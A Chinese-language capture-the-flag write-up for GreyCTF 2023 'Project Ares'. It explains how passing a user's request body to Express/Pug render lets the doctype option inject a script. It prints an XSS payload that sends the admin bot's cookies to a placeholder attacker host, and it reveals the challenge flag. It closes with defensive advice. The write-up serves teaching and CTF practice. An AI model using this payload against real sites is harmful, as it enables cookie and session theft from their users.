# GreyCTF 2023 Project Ares

## 题目简述

注册接口把扩展 URL 编码后的整个 `req.body` 保存为 profile，查看页面时又直接执行 `res.render("profile", profile)`。攻击者因此不仅控制模板变量，还能注入 Express/Pug 的渲染选项。利用 `doctype` 选项插入脚本，再让管理员机器人携带 flag Cookie 查看 profile，即可完成 XSS。

## 解题过程

正常表单之外再加入两个字段：

```text
cache=
doctype=><script>fetch('//ATTACKER/?c='+encodeURIComponent(document.cookie))</script>
```

`express.urlencoded({extended:true})` 会把这些字段放入普通对象。应用随后调用：

```javascript
const profile = req.body;
res.render('profile', profile);
```

Express 将同一对象同时当作模板 locals 和渲染 options，Pug 因而使用攻击者提供的 `doctype`。前导 `>` 结束原输出上下文，后续 `<script>` 成为实际 HTML；空的 `cache` 字段避免沿用不合适的缓存结果。

创建 profile 后取得 UUID，访问 `/submit/<uuid>`。机器人在站点域下设置可读的 `flag` Cookie并打开 `/profile/<uuid>`，脚本把 Cookie 发送到自有接收端，得到：

```text
grey{dont_pAsS_uS3r_oBj3C7s_To_R3nder_fc4fc28280f702d24b0243c1571f96f1}
```

## 方法总结

模板引擎的第二个参数通常不只是“页面数据”，还可能包含编译、缓存和输出格式选项。不能把用户对象原封不动传给 `render`；应显式挑选允许的业务字段，并用独立、固定的渲染配置。管理员 Cookie 也应设置 HttpOnly，减少 XSS 直接泄露敏感值的后果。
